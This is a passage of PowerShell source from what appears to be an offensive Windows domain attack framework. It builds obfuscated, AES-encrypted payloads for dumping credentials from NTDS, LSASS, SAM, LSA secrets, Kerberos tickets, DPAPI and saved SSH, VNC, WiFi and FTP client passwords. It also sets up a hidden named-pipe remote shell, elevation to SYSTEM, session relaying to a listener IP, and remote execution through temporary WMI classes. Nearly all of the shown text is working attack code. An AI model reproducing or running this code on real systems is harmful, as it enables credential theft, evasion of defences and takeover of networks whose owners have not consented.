        Write-Host "Payload obfucated  :"
    
        Write-Host "  " -ForegroundColor "Yellow" -NoNewline
        Write-host "Old payload length : $OldLength"
    
        Write-Host "  " -ForegroundColor "Yellow" -NoNewline
        Write-Host "New payload length : $($Command.Length)"

        Write-Host ""

        return $Command
    }


   

    # Amnesiac
    if ($Module -eq "Amnesiac") {

        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Amnesiac PID: $Global:AmnesiacPID"

        Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
        Write-Host "PipeName: $Global:PN"

        if ($Scramble) {

            Write-Host ""
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "The switch Scramble is in use. Ensure Amnesiac is already running"

            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "In Amnesiac do ""GLset $Global:PN"" then hit option ""3"""

        }

        $SID = $Global:SID
        $ServerScript = "`$sd=New-Object System.IO.Pipes.PipeSecurity;`$user=New-Object System.Security.Principal.SecurityIdentifier `"$SID`";`$ar=New-Object System.IO.Pipes.PipeAccessRule(`$user,`"FullControl`",`"Allow`");`$sd.AddAccessRule(`$ar);`$ps=New-Object System.IO.Pipes.NamedPipeServerStream('$PN','InOut',1,'Byte','None',1028,1028,`$sd);`$tcb={param(`$state);`$state.Close()};`$tm = New-Object System.Threading.Timer(`$tcb, `$ps, 600000, [System.Threading.Timeout]::Infinite);`$ps.WaitForConnection();`$tm.Change([System.Threading.Timeout]::Infinite, [System.Threading.Timeout]::Infinite);`$tm.Dispose();`$sr=New-Object System.IO.StreamReader(`$ps);`$sw=New-Object System.IO.StreamWriter(`$ps);while(`$true){if(-not `$ps.IsConnected){break};`$c=`$sr.ReadLine();if(`$c-eq`"exit`"){break}else{try{`$r=iex `"`$c 2>&1|Out-String`";`$r-split`"`n`"|%{`$sw.WriteLine(`$_.TrimEnd())}}catch{`$e=`$_.Exception.Message;`$e-split`"`r?`n`"|%{`$sw.WriteLine(`$_)}};`$sw.WriteLine(`"#END#`");`$sw.Flush()}};`$ps.Disconnect();`$ps.Dispose();exit"
        $b64ServerScript = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ServerScript))

        # Change the command string if the Method is WinRM
        if ($Method -eq "WinRM") {
            $finalString = "powershell.exe -EncodedCommand ""$b64ServerScript"""
        }
        else {
            $finalString = "Start-Process powershell.exe -WindowS Hidden -ArgumentList `"-ep Bypass`", `"-enc $b64ServerScript`""
            $finalString = $finalString -replace '"', "'"
        }

        if ($Elevate -and $Method -ne "SMB") {
            $Command = $finalString

            $ElevateKey = Generate-RandomString 32
            $ElevateIV = Generate-RandomString 16  
            $ElevateData = Invoke-AES -k $ElevateKey -iv $ElevateIV -t "$LocalElevate"

            $Key = Generate-RandomString 32
            $IV = Generate-RandomString 16  
            $DataB64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Command"))
            $Data = Invoke-AES -k $Key -iv $IV -t "$DataB64"  
            $Command = "$Decrypt ; Invoke-Decrypt $ElevateKey $ElevateIV $ElevateData | IEX ; Invoke-RunAsSystem -Command (Invoke-Decrypt $Key $IV $Data) | Out-String"
            Start-Sleep -Seconds 2
        }
        else {
            $Command = $finalString
            Start-Sleep -Seconds 2
        }
    }

    elseif ($Method -eq "DCSync") {
    
        # Do nothing, handled in method-dcsync
        
    }

    # DPAPI
    elseif ($Module -eq "DPAPI") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  

        $Command = $LocalSCCM
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-PowerDPAPI MachineTriage "
    }

    # NTDS
    elseif ($Module -eq "NTDS") {
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $Pandemonium
        $Command = obfuscation-arguments  
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-NTDS"
    }

    # LogonPasswords
    elseif ($Module -eq "LogonPasswords") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $Pandemonium
        $Command = obfuscation-arguments  
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-Pandemonium -command ""dump"" ; Write-output ""`[SYSTEM]:`$env:computername"""
    }

    # eKeys
    elseif ($Module -eq "ekeys") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $Pandemonium
        $Command = obfuscation-arguments  
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-Pandemonium -command ""ekeys"""
    }

    # LSA
    elseif ($Module -eq "lsa") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $Pandemonium
        $Command = obfuscation-arguments  
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-Pandemonium -command ""lsa"""
    }

    # lsa-trust
    elseif ($Module -eq "lsa-trust") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16
        
        $Command = $Pandemonium
        $Command = obfuscation-arguments  
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-Pandemonium -command ""lsa-trust"""
    }

    # KerbDump
    elseif ($Module -eq "KerbDump") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16

        $Command = $LocalKerbDump
        $Command = obfuscation-arguments
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command

        if ($Option.Split(':')[1] -eq "Monitor") {
            try {
            
                $MonitorTime = [int]$Option.Split(':')[2]
                if (-not (1..240 -contains $MonitorTime)) {
                    throw ""
                }
            }
            catch {
            
                Write-Host "- " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Monitor value out of range (1..240) or invalid. Defaulting to 2 (Minutes)"
                $MonitorTime = 2
            }

            $WMI_Extend = $True
            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-DumpKerberos -Monitor $MonitorTime"
            Write-Host "- " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Ticket monitoring has started. Please be patient for results to return to the console"
        }
        else {

            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-DumpKerberos"

        }
    }



    # Session Relaying
    # must complete obfuscation for here at some point
    elseif ($Module -eq "SessionRelay") {

        # Phase One: Initial Encryption
        $keyPhaseOne = Generate-RandomString 32
        $ivPhaseOne = Generate-RandomString 16  
        $dataPhaseOne = Invoke-AES -k $keyPhaseOne -iv $ivPhaseOne -t "$LocalSessionRelay ; Invoke-SessionRelay -SessionID ""All"" -ListenerIP ""$ListenerIP"""      
        $Command = "$Decrypt ; Invoke-Decrypt $keyPhaseOne $ivPhaseOne $dataPhaseOne | IEX ; Invoke-RunAsSystem -Command (Invoke-Decrypt $keyPhaseOne $ivPhaseOne $dataPhaseOne) | Out-String"
    
        if ($Method -ne "SMB") {

            # Phase Two: Elevation Encryption
            $keyPhaseTwo = Generate-RandomString 32
            $ivPhaseTwo = Generate-RandomString 16  
            $dataPhaseTwo = Invoke-AES -k $keyPhaseTwo -iv $ivPhaseTwo -t "$LocalElevate"

            # Phase Three: Re-encrypt Command for RunAsSystem
            $keyPhaseThree = Generate-RandomString 32
            $ivPhaseThree = Generate-RandomString 16  
            $dataPhaseThreeB64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$LocalSessionRelay ; Invoke-SessionRelay -SessionID ""All"" -ListenerIP ""$ListenerIP"""))
            $dataPhaseThree = Invoke-AES -k $keyPhaseThree -iv $ivPhaseThree -t "$dataPhaseThreeB64"        
            $Command = "$Decrypt ; Invoke-Decrypt $keyPhaseTwo $ivPhaseTwo $dataPhaseTwo | IEX ; Invoke-RunAsSystem -Command (Invoke-Decrypt $keyPhaseThree $ivPhaseThree $dataPhaseThree) | Out-String"
    
        }
    }



    # SessionExec
    elseif ($Module -eq "SessionExec") {
        $ShowOutput = $true

        # Phase One Encryption
        if ($Command -eq "") { $Command = "whoami" }
        else {}

        $Command = obfuscation-arguments
        
        $KeyPhaseOne = Generate-RandomString 32
        $IVPhaseOne = Generate-RandomString 16  
        $DataPhaseOne = Invoke-AES -k $KeyPhaseOne -iv $IVPhaseOne -t "$Command"
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseOne $IVPhaseOne $DataPhaseOne | IEX" 
        $Command = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))

        # Phase Two Encryption
        $Command = "$LocalSessionExec; Invoke-SessionExec -SessionID all -Command `"$Command`""
        $Command = obfuscation-arguments
        $KeyPhaseTwo = Generate-RandomString 32
        $IVPhaseTwo = Generate-RandomString 16  
        $DataPhaseTwo = Invoke-AES -k $KeyPhaseTwo -iv $IVPhaseTwo -t "$Command"
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseTwo $IVPhaseTwo $DataPhaseTwo | IEX"

        if ($Method -ne "SMB") {
            
            # Phase Three Encryption
            $KeyPhaseThree = Generate-RandomString 32
            $IVPhaseThree = Generate-RandomString 16  
            $DataPhaseThree = Invoke-AES -k $KeyPhaseThree -iv $IVPhaseThree -t "$LocalElevate"

            $EncodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
            $Command = "$LocalElevate; Invoke-RunAsSystem -Command $EncodedCommand"
            $Command = obfuscation-arguments

            # Phase Four Encryption
            $KeyPhaseFour = Generate-RandomString 32
            $IVPhaseFour = Generate-RandomString 16  
            $DataPhaseFour = Invoke-AES -k $KeyPhaseFour -iv $IVPhaseFour -t "$Command"
            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseFour $IVPhaseFour $DataPhaseFour | IEX"
        }
    }

    elseif ($Module -eq "TGTDeleg") {

        # Phase One: Initial Command Preparation
        $Command = @"
if ((`$domainName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[0]) -eq `$env:COMPUTERNAME) { return "[-] Local user account, skipping..." }
$rbs ; `$b = (invoke-rtickets send /nowrap) ; (`$b | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
"@
        $Command = obfuscation-arguments

        # Phase One Encryption
        $KeyPhaseOne = Generate-RandomString 32
        $IVPhaseOne = Generate-RandomString 16
        $DataPhaseOne = Invoke-AES -k $KeyPhaseOne -iv $IVPhaseOne -t "$Command"
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseOne $IVPhaseOne $DataPhaseOne | IEX"
        $Command = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))

        # Phase Two: Session Execution
        $Command = "$LocalSessionExec; Invoke-SessionExec -SessionID all -Command `"$Command`""
        $Command = obfuscation-arguments
        $KeyPhaseTwo = Generate-RandomString 32
        $IVPhaseTwo = Generate-RandomString 16
        $DataPhaseTwo = Invoke-AES -k $KeyPhaseTwo -iv $IVPhaseTwo -t "$Command"
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseTwo $IVPhaseTwo $DataPhaseTwo | IEX"

        if ($Method -ne "SMB") {

            # Phase Three: Elevation Command Encryption
            $KeyPhaseThree = Generate-RandomString 32
            $IVPhaseThree = Generate-RandomString 16
            $DataPhaseThree = Invoke-AES -k $KeyPhaseThree -iv $IVPhaseThree -t "$LocalElevate"

            # Preparing Command for System Execution
            $EncodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
            $Command = "$LocalElevate; Invoke-RunAsSystem -Command $EncodedCommand"
            $Command = obfuscation-arguments

            # Phase Four: Final Encryption
            $KeyPhaseFour = Generate-RandomString 32
            $IVPhaseFour = Generate-RandomString 16
            $DataPhaseFour = Invoke-AES -k $KeyPhaseFour -iv $IVPhaseFour -t "$Command"
            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseFour $IVPhaseFour $DataPhaseFour | IEX"
        }
    }

    elseif ($Module -eq "NTLM") {

        # Phase One: Initial Command Preparation
        $Command = "$NetNTLM"
        $Command = obfuscation-arguments

        # Phase One Encryption
        $KeyPhaseOne = Generate-RandomString 32
        $IVPhaseOne = Generate-RandomString 16
        $DataPhaseOne = Invoke-AES -k $KeyPhaseOne -iv $IVPhaseOne -t "$Command"
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseOne $IVPhaseOne $DataPhaseOne | IEX"
        $Command = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))

        # Phase Two: Session Execution
        $Command = "$LocalSessionExec; Invoke-SessionExec -SessionID all -Command `"$Command`""
        $KeyPhaseTwo = Generate-RandomString 32
        $IVPhaseTwo = Generate-RandomString 16
        $DataPhaseTwo = Invoke-AES -k $KeyPhaseTwo -iv $IVPhaseTwo -t "$Command"
        $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseTwo $IVPhaseTwo $DataPhaseTwo | IEX"

        if ($Method -ne "SMB") {

            # Phase Three: Elevation Command Encryption
            $KeyPhaseThree = Generate-RandomString 32
            $IVPhaseThree = Generate-RandomString 16
            $DataPhaseThree = Invoke-AES -k $KeyPhaseThree -iv $IVPhaseThree -t "$LocalElevate"

            # Preparing Command for System Execution
            $EncodedCommand = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
            $Command = "$LocalElevate; Invoke-RunAsSystem -Command $EncodedCommand"

            # Phase Four: Final Encryption
            $KeyPhaseFour = Generate-RandomString 32
            $IVPhaseFour = Generate-RandomString 16
            $DataPhaseFour = Invoke-AES -k $KeyPhaseFour -iv $IVPhaseFour -t "$Command"
            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $KeyPhaseFour $IVPhaseFour $DataPhaseFour | IEX"
        }
    }

    # SCCM
    elseif ($Module -eq "SCCM") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  

        $Command = $LocalSCCM
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-PowerDPAPI sccm "
    }


    # SAM
    elseif ($Module -eq "SAM") {
  
        if ($Method -eq "WinRM") {

            $Command = Out-Compressed -StringInput "$LocalSam"
            $Base64Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Command"))
            $Command = "powershell.exe -enc $Base64Command"

        }

        else {
            
            $Key = Generate-RandomString 32
            $IV = Generate-RandomString 16  

            $Command = $LocalSam
            $Command = obfuscation-arguments
            
            $Data = Invoke-AES -k $Key -iv $IV -t $Command
            $Command = "try {$Arbiter} Catch{} ; $Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
        
        }
    }

    # WinSCP
    elseif ($Module -eq "WinSCP") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  

        $Command = $LocalWinSCP
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # VNC Dump
    elseif ($Module -eq "VNC") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  

        $Command = $LocalVNC
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # Filezilla Dump
    elseif ($Module -eq "FileZilla") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $LocalFileZilla
        $Command = obfuscation-arguments
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # Wifi
    elseif ($Module -eq "wifi") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $LocalWifi
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # SSH
    elseif ($Module -eq "SSH") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $LocalSSH
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # Notepad
    elseif ($Module -eq "Notepad") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $LocalNotepad
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # ConsoleHistory
    elseif ($Module -eq "ConsoleHistory") {
        
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  
        
        $Command = $ConsoleHostHistory
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
    }

    # VMCheck
    elseif ($Module -eq "VMCheck") {
        
        $ShowOutput = $true
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16 
        
        $Command = $LocalVMCheck
        $Command = obfuscation-arguments 
        
        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
        $Module = ""
    }

    # RunAsPPLCheck
    elseif ($Module -eq "RunAsPPL") {
        
        $ShowOutput = $true
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  

        $Command = $LocalPPLCheck
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $Command
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
        $Module = ""
    }

    # MDF
    elseif ($Module -eq "MDF") {
        
        $ShowOutput = $true
        $Key = Generate-RandomString 32
        $IV = Generate-RandomString 16  

        $Command = $DumpMDF
        $Command = obfuscation-arguments

        $Data = Invoke-AES -k $Key -iv $IV -t $DumpMDF
        $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX ; Invoke-MDF"
    }


    # Files
    elseif ($Module -eq "Files") {

        $Command = $Files
        $Command = obfuscation-arguments
        $Command = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
        $Command = "powershell.exe -enc $Command"
    
    }

    # Command Execution
    elseif ($Module -eq "" -and $Command -ne "") {      
        
        if ($Elevate) {
            
            $ElevateKey = Generate-RandomString 32
            $ElevateIV = Generate-RandomString 16  
            $ElevateData = Invoke-AES -k $ElevateKey -iv $ElevateIV -t $LocalElevate

            $Key = Generate-RandomString 32
            $IV = Generate-RandomString 16  
            
            $Command = obfuscation-arguments
            
            $DataB64 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("$Command"))
            $Data = Invoke-AES -k $Key -iv $IV -t $DataB64  
            $Command = "$Decrypt ; Invoke-Decrypt $ElevateKey $ElevateIV $ElevateData | IEX ; Invoke-RunAsSystem -Command (Invoke-Decrypt $Key $IV $Data) | Out-String"
        
        }
        
        else {
        
            $Key = Generate-RandomString 32
            $IV = Generate-RandomString 16
            
            $Command = obfuscation-arguments  
            $Data = Invoke-AES -k $Key -iv $IV -t $Command
            $Command = "$Decrypt ; Invoke-Decrypt $Key $IV $Data | IEX"
        
        }
    }

    ################################################################################################################
    ################################# Logic to help keep output tidy and even ######################################
    ################################################################################################################

    # First conditional check
    if ($Method -ne "Spray" -and $Method -ne "Kerberoast" -and !$IPAddress) {
        $NameLength = ($computers | ForEach-Object { $_.Properties["dnshostname"][0].Length } | Measure-Object -Maximum).Maximum
        $OSLength = ($computers | ForEach-Object { $_.Properties["operatingSystem"][0].Length } | Measure-Object -Maximum).Maximum
    }

    # Second conditional check
    elseif ($Method -ne "Spray" -and $Method -ne "Kerberoast" -and $IPAddress) {
        $NameLength = 16
        $OSLength = 0
    }

    ################################################################################################################
    ################################################ Function: WMI #################################################
    ################################################################################################################
    Function Method-WMI {
        param ($ComputerName)
        Write-host
        $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
        $runspacePool.Open()
        $runspaces = New-Object System.Collections.ArrayList

        $scriptBlock = {
            param ($computerName, $Command, $Username, $Password, $LocalAuth, $Timeout, $MonitorTime, $WMI_Extend)
    
            $tcpClient = New-Object System.Net.Sockets.TcpClient
            $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 

            if ($wait) { 
                try {
                    $tcpClient.EndConnect($asyncResult)
                    $connected = $true
                }
                catch {
                    $connected = $false
                }
            }
            else {
                $connected = $false
            }

            $tcpClient.Close()
            if (!$connected) { return "Unable to connect" }


            Function WMI {
                param (
                    [string]$ComputerName,
                    [string]$Command,
                    [string]$Class = "Win32_" + -join ((65..90 + 97..122 + 48..57) | Get-Random -Count 16 | ForEach-Object { [char]$_ }),
                    [switch]$LocalAuth,
                    [string]$Username,
                    [string]$Password
                )

                # Create PSCredential object if using local authentication
                if ($LocalAuth) {
                    $LocalUsername = "$ComputerName\$Username"
                    $LocalPassword = ConvertTo-SecureString "$Password" -AsPlainText -Force
                    $cred = New-Object System.Management.Automation.PSCredential($LocalUsername, $LocalPassword)
                }

                $WMIAccess = $null
                if ($LocalAuth) { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" -Credential $cred } 
                else { $WMIAccess = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction "SilentlyContinue" }

                if (!$WMIAccess) { return "Access Denied" } 
                elseif ($Command -eq "") { return "Successful Connection PME" }

                function Invoke-Class {
                    param (
                        [string]$ComputerName
                    )

                    if ($LocalAuth) { $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" -Credential $cred }
                    else { $classCheck = Get-WmiObject -Class $Class -ComputerName $ComputerName -List -Namespace "root\cimv2" }

                    if ($classCheck -eq $null) {
                        if ($LocalAuth) {
                            $scope = New-Object System.Management.ManagementScope("\\$ComputerName\root\cimv2", (New-Object System.Management.ConnectionOptions -Property @{ Username = "$Computername\$Username"; Password = $Password }))
                            $scope.Connect()
                            $newClass = New-Object System.Management.ManagementClass($scope, [System.Management.ManagementPath]::DefaultPath, $null)
                        }
                        else { $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2", [string]::Empty, $null) }

                        $newClass["__CLASS"] = "$Class"
                        $newClass.Qualifiers.Add("Static", $true)
                        $newClass.Properties.Add("InstanceID", [System.Management.CimType]::String, $false)
                        $newClass.Properties["InstanceID"].Qualifiers.Add("Key", $true)
                        $newClass.Properties.Add("CommandOutput", [System.Management.CimType]::String, $false)
                        $newClass.Properties.Add("CommandToRun", [System.Management.CimType]::String, $false)
                        $newClass.Put() | Out-Null
                    }

                    if ($LocalAuth) { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName -Credential $cred }
                    else { $wmiInstance = Set-WmiInstance -Class $Class -ComputerName $ComputerName }

                    $wmiInstance.GetType() | Out-Null
                    $wmiInstance.CommandToRun = "$Command"
                    $wmiInstance.Put() | Out-Null
                    $InstanceID = $wmiInstance.InstanceID
                    $wmiInstance.Dispose()
                    return $InstanceID
                }

                # Function to retrieve script output
                function GetScriptOutput {
                    param (
                        [string]$ComputerName,
                        [string]$InstanceID
                    )
                    try {
                        if ($LocalAuth) { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" -Credential $cred }
                        else { $wmiInstance = Get-WmiObject -Class $Class -ComputerName $ComputerName -Filter "InstanceID = '$InstanceID'" }
            
                        $encodedResult = $wmiInstance.CommandOutput
                        $wmiInstance.Dispose()
                        $resultBytes = [Convert]::FromBase64String($encodedResult)
                        $result = [System.Text.Encoding]::UTF8.GetString($resultBytes)
                        return $result
                    }
                    catch {
                        return $_.Exception.Message
                    }
                    finally {
                        if ($wmiInstance) {
                            $wmiInstance.Dispose()
                        }
                    }
                }

                # Function to execute a command remotely
                function Invoke-Execution {
                    param (
                        [string]$ComputerName,
                        [string]$Command
                    )

                    $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command      

                    if ($LocalAuth) { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine -Credential $cred }
                    else { $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine }

                    if ($process.ReturnValue -eq 0) {
                        $started = Get-Date
                        Do {
                            
                            if (-not $MonitorTime) { $MonitorTime = 2 } elseif ($MonitorTime -lt 2) { $MonitorTime = 2 }
                            if ($WMI_Extend) { $MonitorTime += 1 }

                            if ($started.AddMinutes($MonitorTime) -lt (Get-Date)) {
                                Write-Output "Timed Out"
                                break
                            }
    
                            if ($LocalAuth) { $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" -Credential $cred }
                            else { $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)" }
    
                            Start-Sleep -Seconds 1
                        } While ($watcher -ne $null)
                        $scriptOutput = GetScriptOutput -ComputerName $ComputerName -InstanceID $scriptInstanceID
                        return $scriptOutput
                    }
                }

                $scriptInstanceID = Invoke-Class -ComputerName $ComputerName
                if ($scriptInstanceID -eq $null) { return "Error Creating Class" }

                $script = @"
`$commandToRun = (Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`").CommandToRun
`$result = Invoke-Command -ScriptBlock { `$commandToRun | IEX } | Out-String
`$result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$result))
Get-WmiObject -Class $Class -Filter `"InstanceID = '$scriptInstanceID'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null
"@

                $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($script))
                $result = Invoke-Execution -ComputerName $ComputerName -Command $encodedCommand

                try {
                    Start-Sleep -Seconds 1

                    if ($LocalAuth) { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -Credential $cred -ErrorAction "Stop" | Out-Null }
                    else { Remove-WmiObject -Class "$Class" -Namespace "root\cimv2" -ComputerName $ComputerName -ErrorAction "Stop" | Out-Null }

                    $Cleanup = "Success"
                }
                Catch { $Cleanup = "Failure" }
                return @($result, $Cleanup, $Class)
            }




            If ($LocalAuth) { WMI -ComputerName $ComputerName -Command $Command -LocalAuth -Username $Username -Password $Password }
            else { WMI -ComputerName $ComputerName  -Command $Command }

        }

        foreach ($computer in [array]$Computers) {

            if (!$IPAddress) {
                $ComputerName = $computer.Properties["dnshostname"][0]
                $OS = $computer.Properties["operatingSystem"][0]
            }

            elseif ($IPAddress) {
                $ComputerName = "$Computer"
                $OS = "OS:PLACEHOLDER"
            }

            $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Timeout).AddArgument($MonitorTime).AddArgument($WMI_Extend)
            $runspace.RunspacePool = $runspacePool

            [void]$runspaces.Add([PSCustomObject]@{
                    Runspace     = $runspace
                    Handle       = $runspace.BeginInvoke()
                    ComputerName = $ComputerName
                    OS           = $OS
                    Completed    = $false
                })
        }


        do {
            foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {

                if ($runspace.Handle.IsCompleted) {
                    $runspace.Completed = $true
                    $result = $null
                    $result = $runspace.Runspace.EndInvoke($runspace.Handle)[0]
                    $Cleanup = $runspace.Runspace.EndInvoke($runspace.Handle)[1]
                    $Class = $runspace.Runspace.EndInvoke($runspace.Handle)[2]
                    $hasDisplayedResult = $false
                    try {
                        $result = $result.Trim()
                    }
                    catch {}

                    if ($result -eq "Unable to connect") {
                        Continue
                    }

                    
                    elseif ($result -eq "Access Denied") {
                        $Global:AccessDeniedCount++
                        if ($successOnly) { continue }
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[-] " `
                            -statusText "ACCESS DENIED" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($Cleanup -eq "Failure") {
                        Display-ComputerStatus -ComputerName $($runspace.ComputerName) `
                            -OS $($runspace.OS) `
                            -statusColor "Red" `
                            -statusSymbol "[WARNING] " `
                            -statusText "Error when performing cleanup. Cleanup with Remove-WmiObject -Class `"$Class`" -Namespace `"root\cimv2`" -ComputerName $($runspace.ComputerName)" `
                            -NameLength $NameLength `
                            -OSLength $OSLength
                        Continue
                    }
                    elseif ($result -eq "Unspecified Error") {
